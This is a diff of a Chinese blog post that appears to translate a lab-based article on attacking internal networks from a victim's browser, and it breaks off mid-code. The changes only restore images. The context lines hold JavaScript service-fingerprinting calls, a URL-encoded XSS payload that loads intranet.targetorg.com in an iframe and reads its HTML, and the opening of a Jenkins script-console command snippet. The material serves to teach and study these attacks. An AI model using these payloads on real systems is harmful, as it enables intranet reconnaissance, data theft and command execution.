@@ -350,9 +350,7 @@
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>当受害者访问这个页面是，我们将获得：</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/08/A4W87q.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/tencent-6286943-r5xbjlw2zm.jpeg" alt="JavaScript 端口扫描结果"></p>
 <p><strong>图例 2</strong>: 使用 JavaScript 端口扫描的结果</p>
 <p>targetorg.com 域存在于我们的实验室网络中，通过受害者的浏览器使用目标的内部 DNS 服务器来完成对于这些名称的 DNS 查询。对于攻击其他组织，我们可以将 “targetorg.com” 替换为合适的域名，否则我们可以尝试例如 &lsquo;printer&rsquo;，没有任何域名，让受害者的 DNS 解析器自动添加正确的域名。</p>
 <p>我们可以轻松地修改概念验证（PoC）以将结果发回给我们（不展示此代码），我们可以对结果进行一些分析。我们现在知道主机 wiki.targetorg.com 不太有用，因为它的 HTTP 端口已关闭或主机不存在。 标记为开放的端口可能很有趣，因此我们可以对于这些端口做指纹识别，引导我们进入下一阶段的攻击&hellip;&hellip;</p>
@@ -397,9 +395,7 @@ scan(resultElem,hostport,&#39;cisco router&#39;,&#39;/themes/img/speciel/ciscobg
 scan(resultElem,hostport,&#39;seagate&#39;,&#39;/assets/img/Logo_Seagate_White.png&#39;); 
 scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 </code></pre><p>当受害者访问我们的恶意页面时，结果是：</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/08/A4WL8S.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/tencent-6286943-bhuhlj5et7.jpeg" alt="本地及局域网服务指纹识别"></p>
 <p><strong>图例 3</strong>: 本地以及本地局域网上服务的指纹</p>
 <p>再一次，结果将被发送给攻击者。主机 printer.targetorg.com 和 192.168.1.102 可能是同一台主机，因为根据指纹识别它们似乎都是 Lexmark 打印机。intranet.targetorg.com 和 192.168.1.100 可能也是同一个主机。</p>
 <blockquote>
@@ -413,9 +409,7 @@ scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 <p>到目前为止，我们已经讨论过同源策略如何只允许我们发送请求，而不能读取响应。作为一个绕过步骤，让我们看看一个边缘情况，即使在同源策略完全生效的情况下，我们也可以读取响应 - 也就是说，缺少跨域资源共享可以减少同源策略施加的限制。读取响应的能力基本上允许我们使用受害者的浏览器作为代理从外部浏览受害者的内部网络。</p>
 <p>同源策略不会阻止从同一个源的读取页面，并且页面可能会更改其自己的源，以便能够与子域 [21] 进行通信。例如，如果 <a href="http://targetorg.com">http://targetorg.com</a> 已配置为能够与 <a href="http://intranet.targetorg.com">http://intranet.targetorg.com</a> 通信，那么如果我们能够在 targetorg.com 上运行 JavaScript 代码，我们可以像攻击者一样。 <a href="http://targetorg.com">http://targetorg.com</a> 上的跨站脚本（XSS）漏洞可能允许这个场景。</p>
 <p>在用于我们设置的实验室环境中，我们将 targetorg.com 的 DNS 指向公共 IP 地址，因此，它可供攻击者（即我们）进行实验。攻击者在 <a href="http://targetorg.com">http://targetorg.com</a> 网站上发现了一个 XSS 漏洞：</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/08/A4WxDs.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/tencent-6286943-gc86vpp4is.jpeg" alt="targetorg.com 上的 XSS"></p>
 <p><strong>图例 4</strong>: <a href="http://targetorg.com">http://targetorg.com</a> 上的 XSS</p>
 <p>HTML 的源代码为：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
@@ -437,9 +431,7 @@ scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;http://targetorg.com/?inject=var%20iframe%20%3d%20document.createElement(%27 iframe%27);%20iframe.src%20%3d%20%27http://intranet.targetorg.com%27;%20iframe.onload%20%3d%20function(e)%20%7b%20alert(%27Sending%20contents%20of%20intra net.targetorg.com%20to%20attacker:%20%27%20+%20iframe.contentWindow.document. documentElement.outerHTML);%20%7d;%20document.body.appendChild(iframe);&#39;</span>; 
 </span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">theiframe</span>);
 </span></span></code></pre></div><p>当受害者浏览我们的恶意 URL，结果是：</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/08/A4fl8O.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/tencent-6286943-1n1xzd7625.jpeg" alt="通过公网服务器浏览内网"></p>
 <p><strong>图例 5</strong>: 通过公网服务器上的 JavaScript 浏览受害者的内网。</p>
 <p>图例 5 中的截图显示 JavaScript 确实可以访问内网的内容，而不仅仅是在 iframe中 显示它。因此，它也可以将其发送给攻击者。外部 iframe 可以在 targetorg.com 的同源内运行，并且可以访问来自 intranet.targetorg.com 的内部 iframe 的数据。 从本质上讲，这允许我们浏览受害者的内网，查看他们的内网网页。</p>
 <blockquote>
@@ -450,9 +442,7 @@ scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 <p>在展示如何通过绕过步骤浏览 targetorg.com 的内网时，让我们回到通过公网攻击内网服务的任务中。</p>
 <h3 id="用我们的-jenkins-实例做实验">用我们的 Jenkins 实例做实验</h3>
 <p>从我们之前做过的侦察中，我们有可以明确推断出有一个 Jenkins 实例运行在 http://127.0.0.1:8080 。作为攻击者，我们可以设置我们自己的 Jenkins 实例并进行一些实验以准备攻击。Jenkins 有一个可用于执行脚本甚至操作系统命令脚本控制台：</p>
-<blockquote>
-<p><strong>（配图未能自动恢复）</strong> 原地址：<code>https://s2.ax1x.com/2019/04/08/A4f3xe.png</code></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/tencent-6286943-3qlnw69116.jpeg" alt="Jenkins 脚本控制台"></p>
 <p><strong>图例 6</strong>: Jenkins 脚本控制台</p>
 <p>对于执行操作系统命令，我们可以在脚本控制台中输入以下内容并点击运行 [22]：</p>
 <pre tabindex="0"><code>def sout = new StringBuffer(), serr = new StringBuffer() 
